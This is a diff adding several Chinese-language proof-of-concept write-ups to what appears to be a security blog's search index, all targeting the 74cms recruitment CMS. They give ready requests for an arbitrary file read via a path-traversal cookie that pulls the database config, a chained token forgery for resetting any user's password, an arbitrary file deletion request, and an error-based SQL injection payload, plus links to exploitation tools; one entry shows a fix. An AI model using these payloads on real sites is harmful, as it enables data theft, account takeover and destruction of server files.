@@ -30,6 +30,48 @@ shell:http://74cms.test/Application/Home/Conf/config.php
       </tags>
   </entry>
   <entry>
+    <title>74cms v4.2.126-任意文件读取漏洞</title>
+    <url>/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-126-任意文件读取漏洞"><a href="#74cms-v4-2-126-任意文件读取漏洞" class="headerlink" title="74cms v4.2.126-任意文件读取漏洞"></a>74cms v4.2.126-任意文件读取漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载<a id="more"></a>地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02-任意文件读取漏洞演示"><a href="#0x02-任意文件读取漏洞演示" class="headerlink" title="0x02 任意文件读取漏洞演示"></a>0x02 任意文件读取漏洞演示</h2><pre><code>url: http://74cms.test/index.php?m=Home&amp;c=Members&amp;a=register
+
+post: 
+reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
+cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
+headers:
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : )</p>
+<h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：_save_avatar($avatar, $uid)</p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar<br>函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二<br>需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：register()</p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p>上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心</p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p>这里我们讲解一下如果<br>post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。</p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p>这里写着 当 $data[utype] = 1<br>会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了</p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<h2 id="0x04-漏洞利用小工具"><a href="#0x04-漏洞利用小工具" class="headerlink" title="0x04 漏洞利用小工具"></a>0x04 漏洞利用小工具</h2><p><a href="https://github.com/ianxtianxt/74cms-upload">https://github.com/ianxtianxt/74cms-upload</a></p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>（CVE-2015-5254）ActiveMQ 反序列化漏洞</title>
     <url>/2021/01/12/(CVE-2015-5254)ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="（CVE-2015-5254）ActiveMQ-反序列化漏洞"><a href="#（CVE-2015-5254）ActiveMQ-反序列化漏洞" class="headerlink" title="（CVE-2015-5254）ActiveMQ 反序列化漏洞"></a>（CVE-2015-5254）ActiveMQ 反序列化漏洞</h1><a id="more"></a>
@@ -66,6 +108,128 @@ shell:http://74cms.test/Application/Home/Conf/config.php
       </categories>
       <tags>
         <tag>ApacheMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</title>
+    <url>/2021/01/12/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞"><a href="#74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞" class="headerlink" title="74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞"></a>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载<a id="more"></a>地址：<a href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%820x01">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。0x01</a> 74cms升级到最新版1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>突突突突突突突文件：74cms\upload\Application\Home\Controller\ApiController.class.php方法：members_edit(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId23.png"></p>
+<p>从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。那么就让我们直接利用试试。</p>
+<p>先看看数据库现在的数据</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>接着让我们来调接口看看</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>文件：<br>74cms\upload\Application\Home\Controller\ApiController.class.php方法：check_token(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p>接口调用失败的原因是因为，上图的析构函数调用了方法 check_token 进行了token验证</p>
+<p>这些都没有问题，$token 也是我们可以操控的。</p>
+<p>现在的问题就是C(&#39;PWDHASH&#39;) 我们现在无法得到。</p>
+<p>好在，我们还可以通过组合漏洞的形式来获取。</p>
+<p>想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C(&#39;PWDHASH&#39;)<br>的值读取出来，然后在加密验证一下即可</p>
+<p>而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。</p>
+<p>思路：先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数）然后在通过 “任意文件读取漏洞” 读取目标站点的C(&#39;PWDHASH&#39;)<br>的值，接着本地加密成token这样漏洞就可以使用了</p>
+<p>任意文件读取的小脚本下载</p>
+<p><a href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
+<p>下载此文件以后</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>设置成这样，然后执行一下</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>接着把 PWDHASH 复制出来</p>
+<p>我们这里看看加密的代码：文件：74cms\upload\Application\Common\Common\function.php函数：encrypt(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>然后加密一下</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<p>这时你就会发现虽然我们密码改了但是不知道用户名怎么办？</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
+<p>好在我们可以这样利用！人家登录是可以用户名，手机号登录的，所以我们就</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<p>当然如果你要修改用户名登录的话，也可以，看你自己喜欢了</p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
+<h2 id="0x03-利用小工具"><a href="#0x03-利用小工具" class="headerlink" title="0x03 利用小工具"></a>0x03 利用小工具</h2><p>为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。利用工具:</p>
+<p><a href="https://github.com/ianxtianxt/74cms/_file/_read">https://github.com/ianxtianxt/74cms\_file\_read</a></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/rymscc">https://www.yuque.com/pmiaowu/bfgkkh/rymscc</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.3 任意文件删除</title>
+    <url>/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-3-任意文件删除"><a href="#74cms-v4-2-3-任意文件删除" class="headerlink" title="74cms v4.2.3 任意文件删除"></a>74cms v4.2.3 任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介<a id="more"></a></h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>GET /index.php?m=admin&amp;c=database&amp;a=del&amp;name=/../../../../../ HTTP/1.1
+Host: 0-sec.org
+User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/index.php?m=admin&amp;c=database&amp;a=restore
+Connection: close
+Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
+Upgrade-Insecure-Requests: 1</code></pre>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>74cms</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>74cms v4.2.126-通杀sql注入</title>
+    <url>/2021/01/12/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="74cms-v4-2-126-通杀sql注入"><a href="#74cms-v4-2-126-通杀sql注入" class="headerlink" title="74cms v4.2.126-通杀sql注入"></a>74cms v4.2.126-通杀sql注入</h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>厂商：74cms下载地址：<a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p>
+<p>关于版本：新版<a id="more"></a>的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。</p>
+<p>注：此漏洞不用升级至最新版本也可使用。</p>
+<h1 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h1><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为  <a href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h1 id="0x02-数据填充不然没得测试"><a href="#0x02-数据填充不然没得测试" class="headerlink" title="0x02 数据填充不然没得测试"></a>0x02 数据填充不然没得测试</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<h2 id="0x02-1注册商家账号方便测试"><a href="#0x02-1注册商家账号方便测试" class="headerlink" title="0x02.1注册商家账号方便测试"></a>0x02.1注册商家账号方便测试</h2><p>首先先注册一个商家用户然后发布一条消息，注册商家直接去后台注册最简单了注册完成以后将此商家用户登录前台</p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<h2 id="0x02-2注册普通账号方便测试"><a href="#0x02-2注册普通账号方便测试" class="headerlink" title="0x02.2注册普通账号方便测试"></a>0x02.2注册普通账号方便测试</h2><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
+<h1 id="0x03-sql漏洞演示"><a href="#0x03-sql漏洞演示" class="headerlink" title="0x03 sql漏洞演示"></a>0x03 sql漏洞演示</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
+<p>这样的话只要点击完以后有数据 你在 lat  lng  字段都可以正常的进行注入</p>
+<pre><code>Payload: 
+http://74cms.test/index.php?m=&amp;c=jobs&amp;a=jobs_list&amp;lat=23.176465&amp;range=20&amp;lng=113.35038 PI() / 180 - map_x  PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a</code></pre>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
+<h1 id="0x04-漏洞原理"><a href="#0x04-漏洞原理" class="headerlink" title="0x04 漏洞原理"></a>0x04 漏洞原理</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId37.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId39.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId40.png"></p>
+<p>16.png</p>
+<p>说明我们的猜想是没有错的。</p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId42.png"></p>
+<p>所以最终我们符合条件的内容都会赋值为$this-&gt;params</p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId43.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId44.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId45.png"></p>
+<h1 id="0x05-修复方法"><a href="#0x05-修复方法" class="headerlink" title="0x05 修复方法"></a>0x05 修复方法</h1><p><img src="/resource/74cmsv4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/media/rId47.png"></p>
+<pre><code>$this-&gt;field = &quot;id,ROUND(6378.138*2*ASIN(SQRT(POW(SIN((&quot;.floatval($this-&gt;params[&#39;lat&#39;]).&quot;*PI()/180-map_y*PI()/180)/2),2)+COS(&quot;.floatval($this-&gt;params[&#39;lat&#39;]).&quot;*PI()/180)*COS(map_y*PI()/180)*POW(SIN((&quot;.floatval($this-&gt;params[&#39;lng&#39;]).&quot;*PI()/180-map_x*PI()/180)/2),2)))*1000) AS map_range&quot;;</code></pre>
+<p>强转为浮点型，防止注入</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2">https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2</a></p>
+</blockquote>
+]]></content>
+      <categories>
